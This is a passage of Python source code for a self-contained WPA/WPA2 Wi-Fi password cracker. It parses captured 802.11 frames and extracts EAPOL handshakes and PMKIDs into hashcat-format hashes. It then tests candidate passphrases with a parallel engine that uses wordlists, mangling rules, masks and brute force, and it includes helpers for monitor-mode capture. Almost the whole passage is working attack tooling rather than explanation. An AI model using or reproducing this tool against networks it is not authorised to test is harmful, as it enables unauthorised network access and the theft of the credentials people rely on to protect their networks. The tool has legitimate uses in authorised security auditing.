        key_data=b[99 : 99 + kd_len],
    )


@dataclass
class EapolKey:
    ver: int
    dtype: int
    raw: bytes
    key_info: int
    key_len: int
    replay: int
    nonce: bytes
    iv: bytes
    rsc: bytes
    key_id: bytes
    mic: bytes
    key_data: bytes

    # key-info bits: 0-2 version | 3 pairwise | 4 install | 5 ack | 6 mic | 7 secure
    @property
    def pairwise(self) -> bool:
        return bool(self.key_info & 0x0008)

    @property
    def install(self) -> bool:
        return bool(self.key_info & 0x0010)

    @property
    def ack(self) -> bool:
        return bool(self.key_info & 0x0020)

    @property
    def has_mic(self) -> bool:
        return bool(self.key_info & 0x0040)

    @property
    def secure(self) -> bool:
        return bool(self.key_info & 0x0080)

    @property
    def keyver(self) -> int:
        return self.key_info & 0x0007

    @property
    def msg(self) -> int:
        if not self.pairwise:
            return 0
        if self.ack and not self.has_mic:
            return 1
        if self.has_mic and not self.ack and not self.secure:
            return 2
        if self.ack and self.has_mic:
            return 3
        if self.has_mic and not self.ack and self.secure:
            return 4
        return 0


def eapol_zero_mic(raw: bytes) -> bytes:
    if len(raw) < 97:
        return raw
    return raw[:81] + b"\x00" * 16 + raw[97:]


def parse_dot11(frame: bytes) -> dict | None:
    frame = strip_radiotap(frame)
    if len(frame) < 24:
        return None
    fc0 = frame[0]
    if (fc0 & 0x03) != 0:
        return None
    ftype = (fc0 >> 2) & 0x03
    subtype = (fc0 >> 4) & 0x0F
    f1 = frame[1]
    to_ds = bool(f1 & 0x01)
    from_ds = bool(f1 & 0x02)
    prot = bool(f1 & 0x40)
    order = bool(f1 & 0x80)

    a1 = frame[4:10]
    a2 = frame[10:16]
    a3 = frame[16:22]

    p = 24
    if to_ds and from_ds:
        p += 6
    qos = ftype == 2 and bool(subtype & 0x08)
    qos_ctrl = 0
    if qos:
        qos_ctrl = int.from_bytes(frame[p : p + 2], "little")
        p += 2
        if order:
            p += 4
    if len(frame) < p:
        return None
    body = frame[p:]

    if ftype == 0:
        bssid = a3
        sa, da = a2, a1
        ies: list[tuple[int, bytes]] = []
        cap = 0
        if subtype in (MGMT_BEACON, MGMT_PROBE_RESP) and len(body) >= 12:
            cap = int.from_bytes(body[10:12], "little")
            ies = parse_ies(body[12:])
        elif subtype == MGMT_PROBE_REQ:
            ies = parse_ies(body)
        elif subtype in (MGMT_ASSOC_REQ, MGMT_REASSOC_REQ) and len(body) >= 4:
            cap = int.from_bytes(body[0:2], "little")
            off = 4 + (6 if subtype == MGMT_REASSOC_REQ else 0)
            ies = parse_ies(body[off:])
        return {
            "type": ftype, "subtype": subtype, "to_ds": to_ds, "from_ds": from_ds,
            "bssid": bssid, "sa": sa, "da": da, "ssid": ie_get(ies, 0),
            "ies": ies, "eapol": None, "cap": cap, "qos": qos, "protected": prot,
        }

    if ftype != 2:
        return None
    if to_ds and not from_ds:
        bssid, sa, da = a1, a2, a3
    elif from_ds and not to_ds:
        bssid, sa, da = a2, a3, a1
    elif to_ds and from_ds:
        bssid, sa, da = b"", frame[22:28], a3
    else:
        bssid, sa, da = a3, a2, a1

    eapol = None
    if not prot and body:
        amsdu = bool(qos_ctrl & 0x0080)
        chunks = [body]
        if amsdu:
            chunks = []
            off = 0
            while off + 14 <= len(body):
                slen = int.from_bytes(body[off + 12 : off + 14], "big")
                chunks.append(body[off + 14 : off + 14 + slen])
                off += 14 + slen + ((4 - slen % 4) % 4)
        for ch in chunks:
            if len(ch) >= 8 and ch[:6] == b"\xaa\xaa\x03\x00\x00\x00":
                et = int.from_bytes(ch[6:8], "big")
                if et == 0x888E:
                    eapol = ch[8:]
                    break
    return {
        "type": ftype, "subtype": subtype, "to_ds": to_ds, "from_ds": from_ds,
        "bssid": bssid, "sa": sa, "da": da, "ssid": None,
        "ies": None, "eapol": eapol, "cap": 0, "qos": qos, "protected": prot,
    }


# --------------------------------------------------------------------------------------
# targets (hash material)
# --------------------------------------------------------------------------------------
@dataclass
class Target:
    kind: str  # "pmkid" | "eapol"
    ssid: bytes
    ap: bytes
    sta: bytes
    pmkid: bytes = b""
    mic: bytes = b""
    eapol: bytes = b""
    anonce: bytes = b""
    snonce: bytes = b""
    replay: int = 0
    keyver: int = 2
    msgpair: str = "0100"
    note: str = ""

    @property
    def uid(self) -> str:
        return f"{self.kind}:{self.ap.hex()}:{self.sta.hex()}:{self.ssid.hex()}"

    @property
    def ssid_txt(self) -> str:
        return self.ssid.decode("utf-8", "replace") or "<hidden>"

    def to_22000(self) -> str:
        if self.kind == "pmkid":
            return (
                f"WPA*01*{self.pmkid.hex()}*{self.ap.hex()}*{self.sta.hex()}*"
                f"{self.ssid.hex()}***"
            )
        return (
            f"WPA*02*{self.mic.hex()}*{self.ap.hex()}*{self.sta.hex()}*{self.ssid.hex()}*"
            f"{self.anonce.hex()}*{eapol_zero_mic(self.eapol).hex()}*{self.msgpair}"
        )

    def to_dict(self) -> dict:
        return {
            "kind": self.kind, "ssid": self.ssid_txt, "ap": mac_str(self.ap),
            "sta": mac_str(self.sta), "pmkid": self.pmkid.hex(), "mic": self.mic.hex(),
            "anonce": self.anonce.hex(), "snonce": self.snonce.hex(), "replay": self.replay,
            "keyver": self.keyver, "note": self.note,
        }


def parse_22000(line: str) -> Target | None:
    line = line.strip()
    if not line.startswith("WPA*"):
        return None
    f = line.split("*")
    if len(f) < 6:
        return None
    try:
        kind = "pmkid" if f[1] == "01" else "eapol"
        if kind == "pmkid":
            return Target(
                kind="pmkid",
                pmkid=bytes.fromhex(f[2]),
                ap=bytes.fromhex(f[3]),
                sta=bytes.fromhex(f[4]),
                ssid=bytes.fromhex(f[5]),
            )
        eapol = bytes.fromhex(f[7])
        return Target(
            kind="eapol",
            mic=bytes.fromhex(f[2]),
            ap=bytes.fromhex(f[3]),
            sta=bytes.fromhex(f[4]),
            ssid=bytes.fromhex(f[5]),
            anonce=bytes.fromhex(f[6]),
            eapol=eapol,
            snonce=eapol[17:49] if len(eapol) >= 49 else b"",
            msgpair=(f[8] if len(f) > 8 else "0100"),
        )
    except Exception:
        return None


def load_targets(path: str | Path) -> list[Target]:
    p = Path(path)
    out: list[Target] = []
    if not p.exists():
        bad(f"file not found: {p}")
        return out
    if p.suffix.lower() in (".json",):
        data = json.loads(p.read_text(encoding="utf-8"))
        for t in data.get("targets", []):
            if t.get("kind") == "pmkid":
                out.append(Target("pmkid", t["ssid"].encode(), mac_bytes(t["ap"]), mac_bytes(t["sta"]),
                                  pmkid=bytes.fromhex(t["pmkid"])))
            else:
                out.append(Target("eapol", t["ssid"].encode(), mac_bytes(t["ap"]), mac_bytes(t["sta"]),
                                  mic=bytes.fromhex(t["mic"]), anonce=bytes.fromhex(t["anonce"]),
                                  snonce=bytes.fromhex(t.get("snonce", "")),
                                  eapol=bytes.fromhex(t["eapol"])))
        return out
    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        t = parse_22000(line)
        if t:
            out.append(t)
    return out


def save_targets(targets: list[Target], stem: str | Path) -> list[Path]:
    stem = Path(stem)
    written: list[Path] = []
    stem.parent.mkdir(parents=True, exist_ok=True)
    h22 = stem.with_suffix(".22000")
    h22.write_text("\n".join(t.to_22000() for t in targets) + "\n", encoding="utf-8")
    written.append(h22)
    meta = stem.with_suffix(".json")
    meta.write_text(
        json.dumps({"targets": [t.to_dict() for t in targets], "count": len(targets)}, indent=2),
        encoding="utf-8",
    )
    written.append(meta)
    return written


# --------------------------------------------------------------------------------------
# pcap / pcapng readers (no external deps)
# --------------------------------------------------------------------------------------
def read_pcap_bytes(path: str | Path) -> bytes:
    raw = Path(path).read_bytes()
    if raw[:2] == b"\x1f\x8b":
        raw = gzip.decompress(raw)
    return raw


def iter_pcap_packets(path: str | Path) -> Iterator[tuple[int, bytes]]:
    """yield (linktype, packet) from .pcap / .pcapng / .cap.gz"""
    buf = read_pcap_bytes(path)
    if len(buf) < 24:
        return
    magic = buf[:4]

    if magic == b"\x0a\x0d\x0d\x0a":
        ifaces: list[int] = []
        off = 0
        n = len(buf)
        while off + 12 <= n:
            btype = int.from_bytes(buf[off : off + 4], "little")
            blen = int.from_bytes(buf[off + 4 : off + 8], "little")
            if blen < 12 or off + blen > n:
                break
            body = buf[off + 8 : off + blen - 4]
            if btype == 1 and len(body) >= 2:
                ifaces.append(int.from_bytes(body[0:2], "little"))
            elif btype == 6 and len(body) >= 20:
                ifid = int.from_bytes(body[0:4], "little")
                cap = int.from_bytes(body[12:16], "little")
                lt = ifaces[ifid] if ifid < len(ifaces) else LINKTYPE_IEEE802_11_RADIOTAP
                yield lt, body[20 : 20 + cap]
            elif btype == 3 and len(body) >= 4:
                cap = int.from_bytes(body[0:4], "little")
                lt = ifaces[0] if ifaces else LINKTYPE_IEEE802_11_RADIOTAP
                yield lt, body[4 : 4 + cap]
            off += blen
        return

    endian = "<"
    if magic == b"\xd4\xc3\xb2\xa1":
        endian = "<"
    elif magic == b"\xa1\xb2\xc3\xd4":
        endian = ">"
    elif magic == b"\x4d\x3c\xb2\xa1":
        endian = "<"  # nanosecond
    elif magic == b"\xa1\xb2\x3c\x4d":
        endian = ">"
    else:
        return

    linktype = struct.unpack(endian + "I", buf[20:24])[0] & 0x0FFFFFFF
    off = 24
    n = len(buf)
    while off + 16 <= n:
        incl = struct.unpack(endian + "I", buf[off + 8 : off + 12])[0]
        off += 16
        if incl > n - off:
            break
        yield linktype, buf[off : off + incl]
        off += incl


def normalize_link(pkt: bytes, linktype: int) -> bytes:
    if linktype == LINKTYPE_IEEE802_11_RADIOTAP:
        return strip_radiotap(pkt)
    if linktype == LINKTYPE_PPI and len(pkt) >= 8:
        hlen = int.from_bytes(pkt[2:4], "little")
        return pkt[hlen:]
    return pkt


# --------------------------------------------------------------------------------------
# collector: beacons, clients, handshakes, pmkids
# --------------------------------------------------------------------------------------
class Collector:
    def __init__(self) -> None:
        self.ssids: dict[bytes, bytes] = {}
        self.meta: dict[bytes, dict] = {}
        self.pmkids: dict[str, Target] = {}
        self.anonces: dict[tuple[bytes, bytes, int], bytes] = {}
        self.sta_frames: list[dict] = []
        self.clients: set[bytes] = set()
        self.probes: Counter = Counter()
        self.counts: Counter = Counter()
        self.channels: Counter = Counter()
        self.ap_signals: dict[bytes, int] = {}
        self._seen_hashes: set[str] = set()

    # -- helpers --
    def ssid_of(self, bssid: bytes) -> bytes:
        return self.ssids.get(bssid, b"")

    def set_ssid(self, bssid: str | bytes, ssid: str | bytes) -> None:
        b = mac_bytes(bssid) if not isinstance(bssid, bytes) else bssid
        s = ssid.encode() if isinstance(ssid, str) else ssid
        self.ssids[b] = s

    def feed(self, frame: bytes) -> None:
        d = parse_dot11(frame)
        if not d:
            self.counts["bad"] += 1
            return
        self.counts["frames"] += 1
        self.counts[f"t{d['type']}.s{d['subtype']}"] += 1
        bssid = d["bssid"]

        if d["type"] == 0:
            ssid = d["ssid"]
            if bssid and ssid:
                if not self.ssids.get(bssid):
                    self.ssids[bssid] = ssid
                if d["subtype"] in (MGMT_BEACON, MGMT_PROBE_RESP) and d["ies"]:
                    sec = security_from_ies(d["ies"], d["cap"])
                    self.meta[bssid] = sec
                    self.counts["beacons"] += 1
            if d["subtype"] == MGMT_PROBE_REQ:
                self.clients.add(d["sa"])
                if ssid:
                    self.probes[ssid.decode("utf-8", "replace")] += 1
                self.counts["probe_req"] += 1
            if d["subtype"] in (MGMT_ASSOC_REQ, MGMT_REASSOC_REQ):
                self.clients.add(d["sa"])
                if d["ies"]:
                    rsn = ie_get(d["ies"], 48)
                    if rsn:
                        for pmk in parse_rsn(rsn)["pmkids"]:
                            self._add_pmkid(bssid, d["sa"], pmk)
            if d["subtype"] == MGMT_AUTH:
                self.counts["auth"] += 1
            return

        if d["type"] != 2:
            return
        if d["eapol"] is None:
            self.counts["data"] += 1
            return

        ek = parse_eapol(d["eapol"])
        if not ek:
            self.counts["bad_eapol"] += 1
            return
        ap = bssid
        if not ap:
            return
        sta = d["sa"] if d["to_ds"] else d["da"]
        if not sta or sta == b"\xff" * 6:
            return
        self.clients.add(sta)
        self.counts["eapol"] += 1
        m = ek.msg
        self.counts[f"m{m}"] += 1

        if m in (1, 3) and ek.nonce != b"\x00" * 32:
            self.anonces[(ap, sta, ek.replay)] = ek.nonce
            if m == 3:
                self.anonces.setdefault((ap, sta, 0), ek.nonce)
        if m == 1 and ek.key_data and not ek.secure:
            ies = parse_ies(ek.key_data)
            rsn = ie_get(ies, 48)
            if rsn:
                for pmk in parse_rsn(rsn)["pmkids"]:
                    self._add_pmkid(ap, sta, pmk)
        if m in (2, 4):
            self.sta_frames.append(
                {
                    "ap": ap, "sta": sta, "eapol": ek.raw, "mic": ek.mic, "snonce": ek.nonce,
                    "replay": ek.replay, "keyver": ek.keyver, "msg": m,
                }
            )

    def _add_pmkid(self, ap: bytes, sta: bytes, pmk: bytes) -> None:
        if not pmk or pmk == b"\x00" * 16:
            return
        t = Target(kind="pmkid", ssid=self.ssid_of(ap), ap=ap, sta=sta, pmkid=pmk,
                   note="from M1/assoc")
        self.pmkids[t.uid] = t
        self.counts["pmkid"] += 1

    # -- output --
    def targets(self, need_ssid: bool = True) -> list[Target]:
        out: dict[str, Target] = {}
        for uid, t in self.pmkids.items():
            if need_ssid and not t.ssid:
                continue
            out[t.uid] = t
        for f in self.sta_frames:
            if f["mic"] == b"\x00" * 16:
                continue
            ssid = self.ssid_of(f["ap"])
            if need_ssid and not ssid:
                continue
            cands = [
                (k, v) for k, v in self.anonces.items() if k[0] == f["ap"] and k[1] == f["sta"]
            ]
            if not cands:
                continue
            # prefer the anonce with the same replay counter, then anything
            cands.sort(key=lambda kv: (kv[0][2] != f["replay"],))
            for k, anonce in cands:
                t = Target(
                    kind="eapol", ssid=ssid, ap=f["ap"], sta=f["sta"], mic=f["mic"],
                    eapol=f["eapol"], anonce=anonce, snonce=f["snonce"], replay=f["replay"],
                    keyver=f["keyver"], msgpair="0100" if f["msg"] == 2 else "0302",
                )
                out[t.uid + anonce.hex()] = t
        return list(out.values())

    def aps(self) -> list[dict]:
        rows = []
        for bssid, ssid in self.ssids.items():
            m = self.meta.get(bssid, {})
            rows.append(
                {
                    "bssid": mac_str(bssid),
                    "ssid": ssid.decode("utf-8", "replace"),
                    "auth": m.get("auth", "?"),
                    "cipher": m.get("cipher", "?"),
                    "pmf": m.get("pmf"),
                    "wps": m.get("wps"),
                }
            )
        return sorted(rows, key=lambda r: r["ssid"].lower())


def analyze_pcap(path: str | Path, verbose: bool = True) -> Collector:
    col_ = Collector()
    n = 0
    for linktype, pkt in iter_pcap_packets(path):
        col_.feed(normalize_link(pkt, linktype))
        n += 1
    if verbose:
        info(f"{n} packets parsed from {Path(path).name}")
    return col_


# --------------------------------------------------------------------------------------
# WPA crypto (PMK -> PTK -> MIC, PMKID) - pure stdlib
# --------------------------------------------------------------------------------------
def derive_pmk(passphrase: bytes, ssid: bytes, iterations: int = 4096) -> bytes:
    return hashlib.pbkdf2_hmac("sha1", passphrase, ssid, iterations, 32)


def prf512(pmk: bytes, data: bytes, label: bytes = b"Pairwise key expansion") -> bytes:
    out = b""
    i = 0
    while len(out) < 64:
        out += hmac.new(pmk, label + b"\x00" + data + bytes([i]), hashlib.sha1).digest()
        i += 1
    return out[:64]


def ptk_input(ap: bytes, sta: bytes, anonce: bytes, snonce: bytes) -> bytes:
    a, b = (ap, sta) if ap <= sta else (sta, ap)
    c, d = (anonce, snonce) if anonce <= snonce else (snonce, anonce)
    return a + b + c + d


def mic_for_pmk(pmk: bytes, prf_data: bytes, eapol_zero: bytes, keyver: int = 2) -> bytes:
    kck = prf512(pmk, prf_data)[:16]
    if keyver == 1:
        return hmac.new(kck, eapol_zero, hashlib.md5).digest()
    return hmac.new(kck, eapol_zero, hashlib.sha1).digest()[:16]


def pmkid_for_pmk(pmk: bytes, ap: bytes, sta: bytes) -> bytes:
    return hmac.new(pmk, b"PMK Name" + ap + sta, hashlib.sha1).digest()[:16]


def verify_password(target: Target, password: str | bytes) -> bool:
    pw = password.encode() if isinstance(password, str) else password
    if not (8 <= len(pw) <= 63):
        return False
    pmk = derive_pmk(pw, target.ssid)
    if target.kind == "pmkid":
        return pmkid_for_pmk(pmk, target.ap, target.sta) == target.pmkid
    snonce = target.snonce or (target.eapol[17:49] if len(target.eapol) >= 49 else bytes(32))
    data = ptk_input(target.ap, target.sta, target.anonce, snonce)
    return mic_for_pmk(pmk, data, eapol_zero_mic(target.eapol), target.keyver) == target.mic


# --------------------------------------------------------------------------------------
# rules & masks
# --------------------------------------------------------------------------------------
LEET_MAP = str.maketrans({"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7", "b": "8", "g": "9"})
YEAR_SUFFIX = [str(y) for y in range(1970, 2031)]
COMMON_NUM_SUFFIX = ["1", "12", "123", "1234", "12345", "123456", "1234567", "12345678", "0", "00",
                     "000", "0000", "7", "77", "777", "7777", "9", "99", "999", "111", "1111",
                     "786", "110", "1375", "1400", "2020", "2021", "2022", "2023", "2024", "2025",
                     "321", "654321", "112233", "1qaz2wsx", "!@#$"]
SYMBOLS = ["!", "!!", "@", "#", "$", ".", "-", "_", "*", "123!", "1!", "@123", "#1"]

RULE_HELP = {
    "lower": "lowercase",
    "upper": "UPPERCASE",
    "capital": "Capitalized",
    "reverse": "esrever",
    "leet": "l33t substitution",
    "double": "wordword",
    "strip": "remove trailing digits",
    "append_digits": "word+0..99",
    "append_years": "word+1970..2030",
    "append_numbers": "word+common suffixes (123, 1234, 786, ...)",
    "append_symbols": "word+symbols",
    "prepend_digits": "0..9+word",
    "prepend_symbols": "symbols+word",
    "ssid_suffix": "word+SSID(last 4 chars, filled by crack)",
}
RULE_PRESETS = {
    "none": [],
    "basic": ["lower", "capital", "append_digits"],
    "medium": ["lower", "capital", "upper", "append_digits", "append_years", "leet"],
    "best": ["lower", "capital", "upper", "reverse", "leet", "append_digits", "append_years",
             "append_numbers", "append_symbols", "prepend_digits", "double"],
}


def rule_variants(word: str, rule: str) -> list[str]:
    if rule == "lower":
        return [word.lower()]
    if rule == "upper":
        return [word.upper()]
    if rule == "capital":
        return [word[:1].upper() + word[1:].lower()]
    if rule == "reverse":
        return [word[::-1]]
    if rule == "leet":
        return [word.translate(LEET_MAP)]
    if rule == "double":
        return [word + word]
    if rule == "strip":
        m = re.match(r"^(.*?)(\d*)$", word)
        return [m.group(1)] if m and m.group(1) else [word]
    if rule == "append_digits":
        return [word + str(i) for i in range(100)]
    if rule == "append_years":
        return [word + y for y in YEAR_SUFFIX]
    if rule == "append_numbers":
        return [word + s for s in COMMON_NUM_SUFFIX]
    if rule == "append_symbols":
        return [word + s for s in SYMBOLS]
    if rule == "prepend_digits":
        return [str(i) + word for i in range(10)]
    if rule == "prepend_symbols":
        return [s + word for s in SYMBOLS]
    return [word]


# rule pairs worth chaining automatically (word -> transform A -> transform B)
RULE_COMBOS = [
    ("capital", "append_numbers"),
    ("capital", "append_digits"),
    ("capital", "append_years"),
    ("capital", "append_symbols"),
    ("lower", "append_digits"),
    ("lower", "append_numbers"),
    ("leet", "append_numbers"),
    ("leet", "append_digits"),
]


def apply_rules(word: str, rules: Sequence[str]) -> Iterator[str]:
    """independent manglings of one word (+ a few high-value two-step combos)."""
    yield word
    for r in rules:
        yield from rule_variants(word, r)
    rs = set(rules)
    for a, b in RULE_COMBOS:
        if a in rs and b in rs:
            for va in rule_variants(word, a):
                yield from rule_variants(va, b)


DEFAULT_CHARSETS = {
    "d": string.digits,
    "l": string.ascii_lowercase,
    "u": string.ascii_uppercase,
    "s": "!@#$%^&*()-_=+[]{};:,.?/|~",
    "a": string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{};:,.?/|~",
    "b": "0123456789abcdef",
    "h": "0123456789ABCDEF",
    "x": "0123456789abcdefABCDEF",
}


def parse_mask(mask: str, custom: dict[str, str] | None = None) -> list[str]:
    """'?u?l?l?l?d?d?d?d' -> list of per-position character sets."""
    custom = custom or {}
    out: list[str] = []
    i = 0
    while i < len(mask):
        ch = mask[i]
        if ch == "?" and i + 1 < len(mask):
            k = mask[i + 1]
            if k == "?":
                out.append("?")
            elif k in custom:
                out.append(custom[k])
            elif k in DEFAULT_CHARSETS:
                out.append(DEFAULT_CHARSETS[k])
            else:
                out.append(k)
            i += 2
        else:
            out.append(ch)
            i += 1
    return out


def mask_iter(mask: str, custom: dict[str, str] | None = None) -> Iterator[str]:
    positions = parse_mask(mask, custom)
    for tup in itertools.product(*positions):
        yield "".join(tup)


def mask_keyspace(mask: str, custom: dict[str, str] | None = None) -> int:
    n = 1
    for p in parse_mask(mask, custom):
        n *= len(p)
    return n


def brute_iter(charset: str, minlen: int, maxlen: int) -> Iterator[str]:
    for L in range(max(1, minlen), maxlen + 1):
        for tup in itertools.product(charset, repeat=L):
            yield "".join(tup)


def brute_keyspace(charset: str, minlen: int, maxlen: int) -> int:
    return sum(len(charset) ** L for L in range(max(1, minlen), maxlen + 1))


BUILTIN_WORDS = """
password 12345678 123456789 1234567890 qwertyuiop 1q2w3e4r 1qaz2wsx zaq12wsx asdfghjkl
password1 password123 passw0rd P@ssw0rd P@ssword123 admin123 administrator
iloveyou sunshine princess football baseball superman batman matrix secret
internet wireless wifi wlan router modem network home internet1
changeme default guest root toor test test123 demo
1234567 11111111 00000000 88888888 99999999 12341234 11223344 123123123
qwerty123 qwerty1 abc123 abcd1234 a1b2c3d4 qazwsxedc 1q2w3e4r5t 1qazxsw2
letmein welcome welcome1 monkey dragon master shadow michael jennifer jordan
apartment mobile phone number tehran iran persian farsi ali reza mohammad
samsung iphone huawei xiaomi redmi mercedes ferrari barcelona realmadrid
mywifi mynetwork myhome homenet workoffice officeguest
Dilink dilink ELTX eltx zxcvbnm poiuytrewq mnbvcxz
""".split()


# --------------------------------------------------------------------------------------
# cracking engine
# --------------------------------------------------------------------------------------
_W: dict[str, Any] = {}


def _payload(t: Target) -> dict:
    return {
        "uid": t.uid,
        "ssid": t.ssid,
        "kind": t.kind,
        "ap": t.ap,
        "sta": t.sta,
        "pmkid": t.pmkid,
        "mic": t.mic,
        "prf": ptk_input(t.ap, t.sta, t.anonce, t.snonce or (t.eapol[17:49] if len(t.eapol) >= 49 else bytes(32))) if t.kind == "eapol" else b"",
        "eapol": eapol_zero_mic(t.eapol) if t.kind == "eapol" else b"",
        "keyver": t.keyver,
        "label": f"{t.ssid_txt} ({mac_str(t.ap)}) [{t.kind}]",
    }


def _worker_init(payloads: list[dict]) -> None:
    groups: dict[bytes, list[dict]] = defaultdict(list)
    for p in payloads:
        groups[p["ssid"]].append(p)
    _W["groups"] = dict(groups)
    _W["done"] = set()


def _worker(chunk: list[bytes]) -> tuple[int, list[tuple[str, str, str]]]:
    hits: list[tuple[str, str, str]] = []
    groups: dict[bytes, list[dict]] = _W["groups"]
    done: set[str] = _W["done"]
    n = 0
    for pw in chunk:
        n += 1
        for ssid, plist in groups.items():
            live = [p for p in plist if p["uid"] not in done]
            if not live:
                continue
            pmk = derive_pmk(pw, ssid)
            for p in live:
                if p["kind"] == "pmkid":
                    if pmkid_for_pmk(pmk, p["ap"], p["sta"]) == p["pmkid"]:
                        hits.append((p["uid"], p["label"], pw.decode("utf-8", "replace")))
                        done.add(p["uid"])
                else:
                    mic = mic_for_pmk(pmk, p["prf"], p["eapol"], p["keyver"])
                    if mic == p["mic"]:
                        hits.append((p["uid"], p["label"], pw.decode("utf-8", "replace")))
                        done.add(p["uid"])
    return n, hits


def load_pot(path: str | Path | None) -> dict[str, str]:
    out: dict[str, str] = {}
    if not path:
        return out
    p = Path(path)
    if not p.exists():
        return out
    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            rec = json.loads(line)
            out[rec["uid"]] = rec["password"]
        except Exception:
            continue
    return out


def append_pot(path: str | Path, uid: str, label: str, password: str) -> None:
    p = Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    with p.open("a", encoding="utf-8") as f:
        f.write(json.dumps({"uid": uid, "target": label, "password": password, "ts": time.time()}) + "\n")


def _chunks(it: Iterator[bytes], size: int) -> Iterator[list[bytes]]:
    buf: list[bytes] = []
    for x in it:
        buf.append(x)
        if len(buf) >= size:
            yield buf
            buf = []
    if buf:
        yield buf


def crack(
    targets: list[Target],
    cands: Iterator[str],
    total: int | None = None,
    workers: int | None = None,
    pot: str | Path | None = None,
    progress: bool = True,
    chunk_size: int = 400,
    quiet: bool = False,
) -> list[dict]:
    if not targets:
        return []
    seen_pot = load_pot(pot)
    found: list[dict] = []
    payloads: list[dict] = []
    already = 0
    for t in targets:
        if t.uid in seen_pot:
            found.append({"uid": t.uid, "target": f"{t.ssid_txt} ({mac_str(t.ap)})",
                          "password": seen_pot[t.uid], "from": "pot"})
            already += 1
            continue
        payloads.append(_payload(t))

    if not payloads:
        return found

    nproc = workers or max(1, min(os.cpu_count() or 4, 16))
    t0 = time.time()
    processed = 0
    rate = 0.0
    stop = False

    def enc_iter() -> Iterator[bytes]:
        for w in cands:
            b = w.encode("utf-8", "replace")
            if 8 <= len(b) <= 63:
                yield b

    pool = mp.Pool(nproc, initializer=_worker_init, initargs=(payloads,))
    try:
        for cnt, hits in pool.imap_unordered(_worker, _chunks(enc_iter(), chunk_size), chunksize=1):
            processed += cnt
            for uid, label, pw in hits:
                if any(f["uid"] == uid for f in found):
                    continue
                if progress and not quiet:
                    say("")
                ok(f"CRACKED  {label}  ->  {col(pw, C.GRN + C.B)}")
                found.append({"uid": uid, "target": label, "password": pw, "from": "crack"})
                if pot:
                    append_pot(pot, uid, label, pw)
                if len(found) + already >= len(targets):
                    stop = True
                    break
            if progress and not quiet:
                el = time.time() - t0
                rate = processed / el if el > 0 else 0
                frac = f"{100.0 * processed / total:5.1f}%" if total else "  ?  "
                eta = human_time((total - processed) / rate) if (total and rate > 0) else "?"
                say(
                    f"\r{col('[*]', C.CYN)} {frac} {human(processed):>9} "
                    f"{human(rate) + '/s':>10}  eta {eta:>8}   ",
                    end="",
                )
            if stop:
                break
    finally:
        pool.terminate()
        pool.join()
        if progress and not quiet:
            say("")

    if progress and not quiet and rate:
        el = time.time() - t0
        info(f"speed {human(rate)}/s  total {human(processed)} candidates in {human_time(el)}")
    return found


def resolve_rules(rules_arg: str | None) -> list[str]:
    if not rules_arg:
        return []
    out: list[str] = []
    for token in re.split(r"[,\s]+", rules_arg.strip()):
        if not token:
            continue
        if token in RULE_PRESETS:
            out.extend(RULE_PRESETS[token])
        elif token in RULE_HELP:
            out.append(token)
        elif token == "all":
            out.extend(RULE_HELP.keys())
        else:
            warn(f"unknown rule '{token}' (see --list-rules)")
    return out


def build_candidates(args) -> tuple[Iterator[str], int | None]:
    rules = resolve_rules(getattr(args, "rules", None))
    total: int | None = None

    if getattr(args, "mask", None):
        custom = {}
        for i in (1, 2, 3, 4):
            v = getattr(args, f"custom{i}", None)
            if v:
                custom[str(i)] = v
        ks = mask_keyspace(args.mask, custom)
        total = ks

        def gen_mask() -> Iterator[str]:
            yield from mask_iter(args.mask, custom)

        return gen_mask(), total

    if getattr(args, "bruteforce", None):
        cs = args.bruteforce
        if cs in DEFAULT_CHARSETS:
            cs = DEFAULT_CHARSETS[cs]
        total = brute_keyspace(cs, args.min_len, args.max_len)

        def gen_brute() -> Iterator[str]:
            yield from brute_iter(cs, args.min_len, args.max_len)

        return gen_brute(), total

    src = getattr(args, "wordlist", None)
    spec = (src or "").strip()
    use_builtin = (not spec) or ("builtin" in spec.lower())
    paths = resolve_wordlists(spec)
    if not spec:
        curated = sorted(WORDLIST_DIR.glob("*.txt"))
        if curated:
            paths = curated
            info(f"no wordlist given - using {len(curated)} curated list(s)")
        else:
            use_builtin = True
            info("no wordlist given - using builtin list (wordlists/ is empty)")
    extra = list(getattr(args, "extra_words", None) or [])
    words_total = sum(count_lines(q) for q in paths) + (len(BUILTIN_WORDS) if use_builtin else 0) + len(extra)
    if paths:
        info("wordlists: " + ", ".join(q.name for q in paths) + (" + builtin" if use_builtin else ""))

    multiplier = 1
    if rules:
        multiplier = max(1, sum(1 for _ in apply_rules("password", rules)))
    total = words_total * multiplier

    def gen_words() -> Iterator[str]:
        for path in paths:
            try:
                with path.open("r", encoding="utf-8", errors="replace") as f:
                    for line in f:
                        w = line.strip()
                        if w:
                            yield from (apply_rules(w, rules) if rules else (w,))
            except OSError as e:
                warn(f"{path.name}: {e}")
        for w in (BUILTIN_WORDS if use_builtin else []):
            yield from (apply_rules(w, rules) if rules else (w,))
        for w in extra:
            yield from (apply_rules(w, rules) if rules else (w,))

    return gen_words(), total


# --------------------------------------------------------------------------------------
# live helpers: monitor mode, injection, capture
# --------------------------------------------------------------------------------------
def npcap_helper() -> str | None:
    for cand in (
        Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "Npcap" / "WlanHelper.exe",
        Path(r"C:\Program Files\Npcap\WlanHelper.exe"),
    ):
        if cand.exists():
            return str(cand)
    return None


def term_cols() -> int:
    try:
        return shutil.get_terminal_size((80, 24)).columns
    except Exception:
        return 80


def monitor_status(iface: str) -> tuple[bool | None, str]:
    """(supported/active, human message). None = unknown."""
    if IS_TERMUX:
        if is_admin():
            return False, "android: root present, but monitor mode still needs a patched driver (nexmon)"
        return False, "android/termux: no monitor mode without root - scan + offline crack only"
    if IS_WIN:
        h = npcap_helper()
        if not h:
            return None, "Npcap WlanHelper not found"
        rc, out = run([h, iface, "mode"], timeout=15)
        if "error" in out.lower():
            if "802.11" in out:
                return False, "Npcap installed without 'raw 802.11' support - reinstall Npcap with that box ticked"
            return False, out.strip().splitlines()[0][:120]
        rc2, modes = run([h, iface, "modes"], timeout=15)
        supported = "monitor" in modes.lower()
        cur = out.strip().splitlines()[-1] if out.strip() else "?"
        if not supported:
            return False, f"adapter/driver does not offer monitor mode (modes: {modes.strip()[:80]})"
